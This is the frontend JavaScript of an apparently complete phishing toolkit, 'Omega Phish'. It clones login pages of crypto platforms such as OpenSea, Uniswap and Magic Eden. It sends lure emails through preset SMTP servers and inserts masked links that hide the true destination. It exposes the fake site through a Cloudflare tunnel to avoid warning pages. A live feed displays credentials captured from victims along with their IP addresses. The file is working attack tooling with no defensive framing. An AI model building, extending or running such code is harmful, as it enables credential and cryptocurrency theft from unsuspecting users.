// Omega Phish Frontend Logic

let serverRunning = false;

// Pre-made templates for popular platforms
const templates = {
    magiceden: {
        url: 'https://magiceden.us/',
        redirect: 'https://magiceden.us/',
        description: 'Magic Eden - Solana NFT Marketplace'
    },
    jupiter: {
        url: 'https://jup.ag/',
        redirect: 'https://jup.ag/',
        description: 'Jupiter - Solana DEX Aggregator'
    },
    opensea: {
        url: 'https://opensea.io/',
        redirect: 'https://opensea.io/',
        description: 'OpenSea - NFT Marketplace'
    },
    raydium: {
        url: 'https://raydium.io/swap/?inputMint=sol&outputMint=4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R',
        redirect: 'https://raydium.io/swap/?inputMint=sol&outputMint=4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R',
        description: 'Raydium - Solana DEX'
    },
    uniswap: {
        url: 'https://app.uniswap.org/swap?chain=mainnet&inputCurrency=NATIVE',
        redirect: 'https://app.uniswap.org/swap?chain=mainnet&inputCurrency=NATIVE',
        description: 'Uniswap - Ethereum DEX'
    }
};

function applyTemplate() {
    const val = document.getElementById('templateSelect').value;
    const targetUrlInput = document.getElementById('targetUrl');
    const redirectUrlInput = document.getElementById('redirectUrl');

    if (val && val !== 'custom' && templates[val]) {
        const template = templates[val];
        targetUrlInput.value = template.url;
        redirectUrlInput.value = template.redirect;
        targetUrlInput.disabled = true;
        logSystem(`Template loaded: ${template.description}`);
    } else {
        targetUrlInput.disabled = false;
        if (val === 'custom') {
            targetUrlInput.value = '';
            redirectUrlInput.value = '';
            logSystem('Custom URL mode enabled');
        }
    }
}

function applyPreset() {
    const val = document.getElementById('smtpPreset').value;
    if (val === 'gmail') {
        document.getElementById('smtpHost').value = 'smtp.gmail.com';
        document.getElementById('smtpPort').value = '465'; // SSL default
    } else if (val === 'outlook') {
        document.getElementById('smtpHost').value = 'smtp.office365.com';
        document.getElementById('smtpPort').value = '587';
    } else if (val === 'yahoo') {
        document.getElementById('smtpHost').value = 'smtp.mail.yahoo.com';
        document.getElementById('smtpPort').value = '465';
    } else if (val === 'mailgun') {
        document.getElementById('smtpHost').value = 'smtp.mailgun.org';
        document.getElementById('smtpPort').value = '587';
    }
}

// URL Masking Function
function insertMaskedLink() {
    const displayUrl = document.getElementById('displayUrl').value;
    const actualUrl = document.getElementById('actualUrl').value;
    const emailBody = document.getElementById('mailBody');

    if (!displayUrl || !actualUrl) {
        alert('Please enter both Display URL and Actual URL');
        return;
    }

    // Create the masked link HTML
    const maskedLink = `<a href="${actualUrl}">${displayUrl}</a>`;

    // Insert at cursor position or append
    const cursorPos = emailBody.selectionStart;
    const textBefore = emailBody.value.substring(0, cursorPos);
    const textAfter = emailBody.value.substring(cursorPos);

    emailBody.value = textBefore + maskedLink + textAfter;

    // Move cursor after inserted text
    emailBody.selectionStart = emailBody.selectionEnd = cursorPos + maskedLink.length;
    emailBody.focus();

    logEmail(`✅ Masked link inserted: "${displayUrl}" → ${actualUrl}`);
}

document.addEventListener('DOMContentLoaded', () => {
    // Tab Switching
    window.switchTab = (id) => {
        document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
        document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));

        document.getElementById(id).classList.add('active');

        // Find button index to highlight
        const btns = document.querySelectorAll('.nav-btn');
        if (id === 'tab-setup') btns[0].classList.add('active');
        if (id === 'tab-email') btns[1].classList.add('active');
        if (id === 'tab-feed') btns[2].classList.add('active');
        if (id === 'tab-help') btns[3].classList.add('active');
    };

    // Button Listeners
    const btnClone = document.getElementById('btnCloneStart');
    if (btnClone) btnClone.addEventListener('click', toggleServer);

    const btnSend = document.getElementById('btnSendMail');
    if (btnSend) btnSend.addEventListener('click', sendMail);

    // IPC Listeners
    if (window.electronAPI) {
        // Log Listener
        if (window.electronAPI.onPhishLog) {
            window.electronAPI.onPhishLog((log) => {
                if (log.type === 'cred') {
                    logCred(log);
                } else if (log.msg.startsWith('[SMTP]')) {
                    // Strip prefix for cleaner display
                    logEmail(log.msg.replace('[SMTP] ', ''));
                } else {
                    logSystem(log.msg);
                }
            });
        }

        // Generated Link Listener
        if (window.electronAPI.onPhishLinkGenerated) {
            window.electronAPI.onPhishLinkGenerated((link) => {
                // Show public URL container
                const container = document.getElementById('publicUrlContainer');
                const urlInput = document.getElementById('publicUrl');
                if (container && urlInput) {
                    urlInput.value = link;
                    container.style.display = 'block';
                }

                // Update email body with the link
                const emailBody = document.getElementById('mailBody');
                if (emailBody && emailBody.value.includes('http://localhost:8080')) {
                    emailBody.value = emailBody.value.replace('http://localhost:8080', link);
                }
            });
        }
    }
});

// Copy public URL to clipboard
function copyPublicUrl() {
    const urlInput = document.getElementById('publicUrl');
    if (urlInput) {
        urlInput.select();
        document.execCommand('copy');
        alert('Public URL copied to clipboard!');
    }
}

// Manual Cloudflare Tunnel
async function getPublicUrl() {
    const btn = document.getElementById('btnGetPublicUrl');
    const port = document.getElementById('listenPort').value || '8080';

    if (!serverRunning) {
        alert('Please start the server first!');
        return;
    }

    btn.disabled = true;
    btn.innerText = 'STARTING CLOUDFLARE TUNNEL...';
    logSystem('Starting Cloudflare Tunnel...');

    try {
        const result = await window.electronAPI.invoke('start-cloudflare-tunnel', { port: parseInt(port) });

        if (result.success) {
            // Show URL in UI
            const container = document.getElementById('publicUrlContainer');
            const urlInput = document.getElementById('publicUrl');
            urlInput.value = result.url;
            container.style.display = 'block';

            logSuccess(`🌐 PUBLIC URL: ${result.url}`);
            logSuccess('✨ No warning page - direct access!');
            btn.innerText = 'TUNNEL ACTIVE';
            btn.style.background = '#00aa00';
        } else {
            logSystem(`Error: ${result.error}`);
            btn.disabled = false;
            btn.innerText = 'GET PUBLIC URL (CLOUDFLARE)';
        }
    } catch (e) {
        logSystem(`Error: ${e.message}`);
        btn.disabled = false;
        btn.innerText = 'GET PUBLIC URL (CLOUDFLARE)';
    }
}

async function toggleServer() {
    const btn = document.getElementById('btnCloneStart');
    const badge = document.getElementById('serverStatus');

    if (serverRunning) {
        // Stop
        const res = await window.electronAPI.invoke('phish-stop-server');
        if (res.success) {
            serverRunning = false;
            btn.innerText = 'START SERVER';
            badge.innerText = 'STOPPED';
            badge.className = 'status-badge status-stopped';
            logSystem('Server stopped.');
            // Hide public URL container
            document.getElementById('publicUrlContainer').style.display = 'none';
        }
    } else {
        // Start
        const url = document.getElementById('targetUrl').value;
        const port = document.getElementById('listenPort').value;
        const redirect = document.getElementById('redirectUrl').value;
        const useNgrok = document.getElementById('useNgrok').checked;

        if (!url) return alert('Enter a Target URL to clone!');

        btn.disabled = true;
        logSystem(`Cloning ${url}...`);

        const res = await window.electronAPI.invoke('phish-start-server', { url, port, redirect, useNgrok });

        btn.disabled = false;
        if (res.success) {
            serverRunning = true;
            btn.innerText = 'STOP SERVER';
            badge.innerText = 'RUNNING';
            badge.className = 'status-badge status-running';
            logSystem(`Server started on port ${port}. Waiting for victims...`);
        } else {
            logSystem(`Error: ${res.error}`);
        }
    }
}

async function sendMail() {
    const conf = {
        host: document.getElementById('smtpHost').value,
        port: document.getElementById('smtpPort').value,
        user: document.getElementById('smtpUser').value,
        pass: document.getElementById('smtpPass').value,
        from: document.getElementById('mailFrom').value,
        to: document.getElementById('mailTo').value,
        subject: document.getElementById('mailSubject').value,
        body: document.getElementById('mailBody').value
    };

    logEmail(`Queuing email to ${conf.to}...`);
    const res = await window.electronAPI.invoke('phish-send-mail', conf);

    if (res.success) {
        logEmail('✅ Success: Email sent!');
        alert('Email Sent!');
    } else {
        logEmail(`❌ Failed: ${res.error}`);
    }
}

// System Log (Main Tab)
function logSystem(msg) {
    const p = document.getElementById('cloneLog');
    if (!p) return;
    const d = document.createElement('div');
    d.className = 'log-entry';
    d.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
    p.prepend(d);
}

// Email Log (Campaign Tab)
function logEmail(msg) {
    const p = document.getElementById('emailLog');
    if (!p) return;
    const d = document.createElement('div');
    d.style.marginBottom = '2px';
    d.style.fontFamily = 'monospace';

    // Color coding
    if (msg.includes('Error') || msg.includes('Failed') || msg.includes('❌')) d.style.color = '#ff5555';
    else if (msg.includes('Success') || msg.includes('✅') || msg.includes('Sent')) d.style.color = '#55ff55';
    else if (msg.includes('C:')) d.style.color = '#88ccff'; // Client command
    else if (msg.includes('S:')) d.style.color = '#ffcc88'; // Server response
    else d.style.color = '#aaaaaa';

    d.innerHTML = `<span style="color:#666">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
    p.appendChild(d);
    p.scrollTop = p.scrollHeight;
}

// Credential Log (live Feed)
function logCred(log) {
    const p = document.getElementById('feedLog');
    if (!p) return;
    const d = document.createElement('div');
    d.className = 'log-entry';
    d.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString()}]</span> <span class="log-highlight">CAPTURE FROM ${log.ip}:</span><br>`;

    for (const [key, val] of Object.entries(log.creds)) {
        d.innerHTML += `<span style="color:#aaa; margin-left:20px;">${key}:</span> <span style="color:#fff;">${val}</span><br>`;
    }
    p.prepend(d);
}
